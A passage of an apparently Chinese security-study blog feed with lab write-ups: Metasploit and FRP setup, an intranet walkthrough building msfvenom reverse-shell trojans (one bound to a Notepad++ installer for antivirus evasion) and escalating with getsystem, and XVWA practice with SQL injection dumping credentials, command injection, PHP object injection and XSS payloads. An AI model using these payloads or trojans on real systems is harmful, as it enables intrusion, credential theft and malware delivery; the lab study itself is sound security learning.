输出数组中的当前元素和下一个元素的值，然后把数组的内部指针重置到数组中的第一个元素：</p><p>最后根据命名代码，更改save_name数组如下<br>save_name[0]:tmp.php<br>save_name[2]:jpg</p><p>最后拼接为<br>tmp.php.(由于$file[count(file)-1]为sava_name[1]为空)<br><img src="https://img-blog.csdnimg.cn/20210307182738497.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>]]></content>
    
    
    <categories>
      
      <category>信安 靶机</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶机</tag>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>msf安装</title>
    <link href="/2021/07/08/%E4%BF%A1%E5%AE%89/Tools/msf%E5%AE%89%E8%A3%85/"/>
    <url>/2021/07/08/%E4%BF%A1%E5%AE%89/Tools/msf%E5%AE%89%E8%A3%85/</url>
    
    <content type="html"><![CDATA[<h1 id="MSF配置"><a href="#MSF配置" class="headerlink" title="MSF配置"></a>MSF配置</h1><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">curl https:<span class="hljs-regexp">//</span>raw.githubusercontent.com<span class="hljs-regexp">/rapid7/m</span>etasploit-omnibus<span class="hljs-regexp">/master/</span>config<span class="hljs-regexp">/templates/m</span>etasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; \<br>  chmod <span class="hljs-number">755</span> msfinstall &amp;&amp; \<br>  ./msfinstall<br></code></pre></div></td></tr></table></figure><p>安装成功。</p><p><img src="https://ftp.bmp.ovh/imgs/2021/07/451848096f1e0b0f.png"></p>]]></content>
    
    
    <categories>
      
      <category>信安 Tools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网渗透流程</title>
    <link href="/2021/07/08/%E4%BF%A1%E5%AE%89/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B/"/>
    <url>/2021/07/08/%E4%BF%A1%E5%AE%89/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="内网渗透的尝试"><a href="#内网渗透的尝试" class="headerlink" title="内网渗透的尝试"></a>内网渗透的尝试</h1><h1 id="首先生成木马"><a href="#首先生成木马" class="headerlink" title="首先生成木马"></a>首先生成木马</h1><p>利用Metersploit进行生成</p><p>基本命令如下</p><blockquote><p>msfvenom -a x64 –platform linux  -p linux/x64/meterpreter/reverse_tcp  LHOST=192.168.42.49 LPORT=5555  -i 3 -f elf -o test</p></blockquote><p>其中lhost表示listening host，lport表示listening port。具体翻译命令表示平台架构为linux x64，使用payload是linux/x64/meterpreter/reverse_tcp，目标文件的格式是elf。可执行目标文件的名称是test</p><p>此时生成对应的windows的木马</p><blockquote><p>msfvenom -a x64 –platform windows  -p windows/x64/meterpreter/reverse_tcp  LHOST=192.168.66.132 LPORT=4444  -i 3 -f exe -o payload_test.exe</p></blockquote><p>生成对应Android的木马</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.10.27 LPORT=8888 -o app.apk<br></code></pre></div></td></tr></table></figure><p>生成免杀木马</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 通过绑定到其它exe文件来生成木马</span><br>msfvenom -p windows/meterpreter_reverse_tcp  LHOST=10.10.20.2 LPORT=3333 -e x86/shikata_ga_nai -x npp.7.8.6.Installer.exe -i 12 -f exe -o /root/npp1.exe<br></code></pre></div></td></tr></table></figure><table><thead><tr><th>参数</th><th>备注</th></tr></thead><tbody><tr><td>-e</td><td>指定编码方式对攻击载荷进行重新编码</td></tr><tr><td>-x</td><td>指定木马捆绑在那个可执行程序模板上</td></tr><tr><td>-i</td><td>对指定目标进行编码的次数，多次编码理论上有助于免杀</td></tr><tr><td>-f</td><td>指定MSF编码输出的程序格式</td></tr><tr><td>-o</td><td>指定处理完毕后的文件输出路径</td></tr></tbody></table><p>进行下一步</p><p>开启msf</p><figure class="highlight ebnf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ebnf"><span class="hljs-attribute">msfconsole</span><br></code></pre></div></td></tr></table></figure><p>加载模块</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">use exploit<span class="hljs-regexp">/multi/</span>handler<br></code></pre></div></td></tr></table></figure><p>设置payload</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># windows</span><br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp<br><span class="hljs-comment"># linux </span><br><span class="hljs-built_in">set</span> payload linux/x64/meterpreter/reverse_tcp<br><span class="hljs-comment"># 需要按照使用的payload进行设置</span><br><span class="hljs-built_in">set</span> payload windows/meterpreter_reverse_tcp <br></code></pre></div></td></tr></table></figure><p>设置监听ip</p><figure class="highlight gams"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> lhost <span class="hljs-comment">192.168.42.49</span><br></code></pre></div></td></tr></table></figure><p>设置监听port</p><figure class="highlight gams"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> LPORT <span class="hljs-comment">4444</span><br></code></pre></div></td></tr></table></figure><p>执行</p><figure class="highlight ebnf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ebnf"><span class="hljs-attribute">exploit</span><br></code></pre></div></td></tr></table></figure><p>此时就能够获取目标机的内容如下：</p><p><img src="https://pic.imgdb.cn/item/60eac9235132923bf8c01c66.png"></p><h1 id="公网ip尝试"><a href="#公网ip尝试" class="headerlink" title="公网ip尝试"></a>公网ip尝试</h1><p>此时重复上面步骤，不过将地址改为公网ip地址尝试</p><p>同样先生成木马设置地址等等。</p><p>最后失败了，连接不上。</p><p>参考<a href="https://blog.csdn.net/qq_38228830/article/details/85955955">内容</a>尝试在本机使用frp进行操作</p><p>将frpc.ini中的设置如下</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">[common]<br><span class="hljs-meta">#</span><span class="bash"> 配置目标地址和端口</span><br>server_addr = 127.0.0.1<br>server_port = 7000<br><br>[ssh]<br><span class="hljs-meta">#</span><span class="bash"> 选择类型</span><br>type = tcp<br><span class="hljs-meta">#</span><span class="bash"> 需要代理出去的ip</span><br>local_ip = 192.168.1.1<br><span class="hljs-meta">#</span><span class="bash"> 需要代理出去访问的端口</span><br>local_port = 1166<br><span class="hljs-meta">#</span><span class="bash"> 这里就是转发出去的端口，也就是在自己的机器上访问的代理端口 rdp:vps的IP:7066</span><br>remote_port = 7066<br></code></pre></div></td></tr></table></figure><p>之后运行./frpc -c frpc.ini，成功连接</p><p>之后设置msf中的lhost，lport为192.168.1.1和1166之后启动<code>exploit</code></p><p>同时目标机运行木马，此时成功建立连接</p><p>在尝试中试图直接设置lhost为远程ip地址，无法连接，设置为127.0.0.1还是无法连接最后改为192.168.1.1才成功。</p><h1 id="尝试提升权限"><a href="#尝试提升权限" class="headerlink" title="尝试提升权限"></a>尝试提升权限</h1><p>首先使用shell进入windows的模式</p><p>如图：</p><p><img src="https://pic.imgdb.cn/item/60eac93e5132923bf8c07670.png"></p><p>并查看了当前权限为admin</p><p>尝试基本的使用getuid和getsystem</p><p>结果如图：</p><p><img src="https://pic.imgdb.cn/item/60eac94b5132923bf8c0a5ad.png"></p><p>获取了最高权限！！！</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>过程中耗费时间最多的是设置监听部分，一直显示Handler failed to bind to最后将地址改为本机地址后终于成功。</p>]]></content>
    
    
    <categories>
      
      <category>信安 渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透</tag>
      
      <tag>内网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>FRP安装</title>
    <link href="/2021/07/08/%E4%BF%A1%E5%AE%89/Tools/FRP%E5%AE%89%E8%A3%85/"/>
    <url>/2021/07/08/%E4%BF%A1%E5%AE%89/Tools/FRP%E5%AE%89%E8%A3%85/</url>
    
    <content type="html"><![CDATA[<h1 id="FRP配置流程"><a href="#FRP配置流程" class="headerlink" title="FRP配置流程"></a>FRP配置流程</h1><h1 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h1><p>下载<a href="https://github.com/fatedier/frp/releases">地址</a>查找对应版本进行下载</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>首先配置分为服务端(后加s)和客户端(后加c)的配置。</p><h2 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h2><p>解压后，配置文件frps.ini</p><p>进入后只是显示了配置端口</p><p><img src="https://pic.imgdb.cn/item/60eac9665132923bf8c1075f.png"></p><p>具体配置如下：</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">[common]<br>bind_port = 7000<br><span class="hljs-meta">#</span><span class="bash"> 当代理出来的是web服务时，在外网访问http://vps的IP:7001</span><br>vhost_https_port = 7001<br><span class="hljs-meta">#</span><span class="bash"> dashboard_port状态以及代理统计信息展示,网址:7500可查看详情</span><br>dashboard_port = 7500<br><span class="hljs-meta">#</span><span class="bash"> dashboard_user访问用户dashboard_pwd访问密码</span><br>dashboard_user = admin<br>dashboard_pwd = password<br><span class="hljs-meta">#</span><span class="bash"> log_file日志文件log_level记录的日志级别log_max_days日志留存3天authentication_timeout超时时间</span><br>log_file = ./frps.log<br>log_level = info<br>log_max_days = 3<br>authentication_timeout = 0<br><span class="hljs-meta">#</span><span class="bash"> max_pool_count最大链接池,每个代理预先与后端服务器建立起指定数量的最大链接数</span><br>max_pool_count = 50<br></code></pre></div></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/60eac9735132923bf8c1324e.jpg"></p><p>配置完成之后启动服务命令如下</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">./frps -c frps.ini<br></code></pre></div></td></tr></table></figure><p>此时可以在浏览器中访问url:7500注意打开端口</p><p><img src="https://pic.imgdb.cn/item/60eac9805132923bf8c160cb.png"></p><h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><p>相同进行frpc.ini的配置</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">[common]<br><span class="hljs-meta">#</span><span class="bash"> 配置目标地址和端口</span><br>server_addr = 127.0.0.1<br>server_port = 7000<br><br>[ssh]<br><span class="hljs-meta">#</span><span class="bash"> 选择类型</span><br>type = tcp<br><span class="hljs-meta">#</span><span class="bash"> 需要代理出去的ip</span><br>local_ip = 127.0.0.1<br><span class="hljs-meta">#</span><span class="bash"> 需要代理出去访问的端口</span><br>local_port = 80<br><span class="hljs-meta">#</span><span class="bash"> 这里就是转发出去的端口，也就是在自己的机器上访问的代理端口 rdp:vps的IP:7066</span><br>remote_port = 7066<br></code></pre></div></td></tr></table></figure><p>之后启动</p><figure class="highlight llvm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs llvm">frpc.exe -<span class="hljs-keyword">c</span> frpc.ini<br></code></pre></div></td></tr></table></figure><p>显示成功</p><p><img src="https://pic.imgdb.cn/item/60eac98c5132923bf8c18d5e.png"></p><p>此时应能够在服务器上访问到本机的80端口界面，访问界面。</p>]]></content>
    
    
    <categories>
      
      <category>信安 Tools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XVWA练习</title>
    <link href="/2021/07/06/%E4%BF%A1%E5%AE%89/%E9%9D%B6%E6%9C%BA/XVWA%E7%BB%83%E4%B9%A0/"/>
    <url>/2021/07/06/%E4%BF%A1%E5%AE%89/%E9%9D%B6%E6%9C%BA/XVWA%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="XVWA练习"><a href="#XVWA练习" class="headerlink" title="XVWA练习"></a>XVWA练习</h1><h1 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h1><p>整体界面如下:</p><p><img src="https://img-blog.csdnimg.cn/20210707095916679.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center"></p><p>在进行尝试之后发现，界面有两个查询点，首先是选择的code，其次是自由输入的查询。</p><p>使用bp抓取选择code后的包，具体如图：</p><p><img src="https://img-blog.csdnimg.cn/20210707095916688.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center"></p><h2 id="item"><a href="#item" class="headerlink" title="item"></a>item</h2><p>在对post的item内容尝试进行注入后，发现注入的类型是整型注入。之后查看回显字段个数。</p><p>sql：1 order by *;#</p><p>经过尝试回显是7，使用联合注入查看回显的位置。sql：0 union select 1,2,3,4,5,6,7;%23</p><p>结果如图：</p><p><img src="https://img-blog.csdnimg.cn/20210707095916744.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center"></p><p>之后进行常规的注入，首先获取版本，库名，表名等。sql：0 union select 1,database(),3,user(),version(),(select group_concat(table_name) from information_schema.tables where table_schema=database()),7 ;%23</p><p>获取内容如下：</p><p><img src="https://img-blog.csdnimg.cn/20210707101127486.png"></p><p>其次获取列名 sql：0 union select 1,database(),3,user(),version(),(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=’users’),7;%23</p><p>获取内容如下：</p><p><img src="https://img-blog.csdnimg.cn/20210707101127358.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center"></p><p>最后对内容进行获取 sql：0 union select 1,database(),3,user(),version(),(select group_concat(concat(username,’-‘,password)) from users),7;%23</p><p>获取内容如下：</p><p><img src="https://img-blog.csdnimg.cn/20210707101127354.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center"></p><h2 id="search"><a href="#search" class="headerlink" title="search"></a>search</h2><p><img src="https://img-blog.csdnimg.cn/20210707095916688.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center"></p><p>对post中的search内容进行修改注入，经过尝试，该点应为字符注入，同样获取回显。</p><p>sql：adda’ union select 1,database(),3,user(),version(),6,7;%23</p><p>获取内容如下：</p><p><img src="https://img-blog.csdnimg.cn/20210707102453262.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center"></p><p>之后与之前的item方法相同，sql:adda’ union select 1,database(),3,user(),version(),(select group_concat(concat(username,’-‘,password)) from users),7;%23</p><p>最后获取内容如下:</p><p><img src="https://img-blog.csdnimg.cn/20210707102453343.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center"></p><h1 id="SQL-Injection-Blind"><a href="#SQL-Injection-Blind" class="headerlink" title="SQL Injection(Blind)"></a>SQL Injection(Blind)</h1><p>此处的的返回信息仅仅是将报错内容隐藏，所以完全参照第一个即可获得内容（第一个注入可以尝试报错注入）。</p><h1 id="OS-Command-Injection"><a href="#OS-Command-Injection" class="headerlink" title="OS Command Injection"></a>OS Command Injection</h1><p>命令执行，具体界面如下：</p><p><img src="https://img-blog.csdnimg.cn/20210707105031107.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center"></p><blockquote><p>|直接执行后面的语句<br>||如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br>&amp;前面和后面命令都要执行，无论前面真假<br>&amp;&amp;如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</p></blockquote><p>尝试在地址后面添加其他内容进行执行，如 127.0.0.1|echo Hello Word,122.0.0.1||echo Hello Word,127.0.0.1&amp;echo Hello Word,127.0.0.1&amp;&amp;echo Hello Word</p><p>结果如下所示:</p><p>127.0.0.1|echo Hello Word</p><p><img src="https://img-blog.csdnimg.cn/20210707105031107.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center"></p><p>122.0.0.1||echo Hello Word</p><p><img src="https://img-blog.csdnimg.cn/20210707105031167.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center"></p><p>127.0.0.1&amp;echo Hello Word,127.0.0.1&amp;&amp;echo Hello Word</p><p><img src="https://img-blog.csdnimg.cn/20210707105031172.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2NTAxNDE5,size_16,color_FFFFFF,t_70#pic_center"></p><h1 id="XPATH-Injection"><a href="#XPATH-Injection" class="headerlink" title="XPATH Injection"></a>XPATH Injection</h1><p>参考<a href="https://www.cnblogs.com/backlion/p/8554749.html">XPATH Injection介绍</a>后对XPATH注入有了基本的了解，尝试注入,通过<a href="https://blog.csdn.net/u014029795/article/details/105133103">XVWA XPATH Injection</a>了解后，发现只是能够将内容全部输出</p><p>内容如下：</p><p><img src="https://pic.imgdb.cn/item/60eac9c05132923bf8c2420d.png"></p><h1 id="Formula-Injection"><a href="#Formula-Injection" class="headerlink" title="Formula Injection"></a>Formula Injection</h1><p>相同先通过晚上了解了相关的<a href="https://www.freebuf.com/vuls/195656.html">漏洞信息</a>之后查看相关题目的解题<a href="https://blog.csdn.net/u014029795/article/details/105216180">wp</a>发现需要在Unrestricted File Upload 进行内容上传，此时上传内容如下：</p><p><img src="https://pic.imgdb.cn/item/60eac9d25132923bf8c2853c.png"></p><p>此时返回界面发现内容已经成功上传，下载下来后打开查看，发现内容如下</p><p><img src="https://pic.imgdb.cn/item/60eac9df5132923bf8c2b007.png"></p><p>但是没有其他人所说的提示，可能是wps已经修复相关的漏洞。</p><h1 id="PHP-Object-Injection"><a href="#PHP-Object-Injection" class="headerlink" title="PHP Object Injection"></a>PHP Object Injection</h1><p>此处为php反序列化的内容，首先需要对代码进行审计。源码如下：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PHPObjectInjection</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$inject</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;inject))&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;inject);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;r&#x27;</span>]))&#123;  <br><br>    <span class="hljs-variable">$var1</span>=unserialize(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;r&#x27;</span>]);<br><br><br>    <span class="hljs-keyword">if</span>(is_array(<span class="hljs-variable">$var1</span>))&#123; <br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>.<span class="hljs-variable">$var1</span>[<span class="hljs-number">0</span>].<span class="hljs-string">&quot; - &quot;</span>.<span class="hljs-variable">$var1</span>[<span class="hljs-number">1</span>];<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span>; <span class="hljs-comment"># nothing happens here</span><br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></div></td></tr></table></figure><p>简单审计之后发现读取传入的r进行反序列化，且调用unserialize之后会调用__wakeup()函数，这个时候就有危险函数eval的调用，且eval中的内容可控。</p><p>编写对应代码生成序列化内容</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PHPObjectInjection</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$inject</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;inject))&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;inject);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> PHPObjectInjection;<br><span class="hljs-variable">$a</span>-&gt;inject=<span class="hljs-string">&#x27;echo Hello;&#x27;</span>; <span class="hljs-comment"># 得到的结果为O:18:&quot;PHPObjectInjection&quot;:1:&#123;s:6:&quot;inject&quot;;s:11:&quot;echo Hello;&quot;;&#125;</span><br><span class="hljs-variable">$a</span>-&gt;inject=<span class="hljs-string">&quot;phpinfo();&quot;</span>; <span class="hljs-comment"># 得到的结果为O:18:&quot;PHPObjectInjection&quot;:1:&#123;s:6:&quot;inject&quot;;s:10:&quot;phpinfo();&quot;;&#125;</span><br>var_dump(serialize(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>最后使用生成的内容形成url：</p><p><a href="http://192.168.66.133/xvwa/vulnerabilities/php_object_injection/?r=O:18:&quot;PHPObjectInjection&quot;:1:%7Bs:6:&quot;inject&quot;;s:11:&quot;echo">http://192.168.66.133/xvwa/vulnerabilities/php_object_injection/?r=O:18:&quot;PHPObjectInjection&quot;:1:{s:6:&quot;inject&quot;;s:11:&quot;echo</a> Hello;”;}</p><p><a href="http://192.168.66.133/xvwa/vulnerabilities/php_object_injection/?r=O:18:&quot;PHPObjectInjection&quot;:1:%7Bs:6:&quot;inject&quot;;s:10:&quot;phpinfo();&quot;;%7D">http://192.168.66.133/xvwa/vulnerabilities/php_object_injection/?r=O:18:&quot;PHPObjectInjection&quot;:1:{s:6:&quot;inject&quot;;s:10:&quot;phpinfo();&quot;;}</a></p><p>命令成功执行：</p><p><img src="https://pic.imgdb.cn/item/60eac9f25132923bf8c2f30e.png"></p><p><img src="https://pic.imgdb.cn/item/60eac9fe5132923bf8c31dfa.png"></p><h1 id="Unrestricted-File-Upload"><a href="#Unrestricted-File-Upload" class="headerlink" title="Unrestricted File Upload"></a>Unrestricted File Upload</h1><p>尝试将php文件上传，发现直接就成功了，没有任何过滤！！！！</p><p>结果如图：</p><p><img src="https://pic.imgdb.cn/item/60eaca095132923bf8c3454a.png"></p><h1 id="XSS-Reflected"><a href="#XSS-Reflected" class="headerlink" title="XSS-Reflected"></a>XSS-Reflected</h1><p>尝试直接写入，直接成功。</p><p><img src="https://pic.imgdb.cn/item/60eaca1b5132923bf8c3821e.png"></p><h1 id="XSS-Stored"><a href="#XSS-Stored" class="headerlink" title="XSS-Stored"></a>XSS-Stored</h1><p>同上直接写入xss就会被保存，前端如下：</p><p><img src="https://pic.imgdb.cn/item/60eaca275132923bf8c3af99.png"></p><h1 id="XSS-DOM-Based"><a href="#XSS-DOM-Based" class="headerlink" title="XSS-DOM Based"></a>XSS-DOM Based</h1><p>直接写入不行，此时尝试其他不使用&lt;script&gt;标签的方式进行xss,如&lt;img src=”sd” onerror=alert(“xss”)&gt;发现还是不行，对前端代码查看后发现xss内容已经写入，但是没有运行。</p><p>对其中的函数search查看后发现会对内容进行unescape编译，且直接在输入框写入会进行两次编译，直接在url写入即可运行，此时代码如下</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;srch&quot;</span>&gt;</span><br>   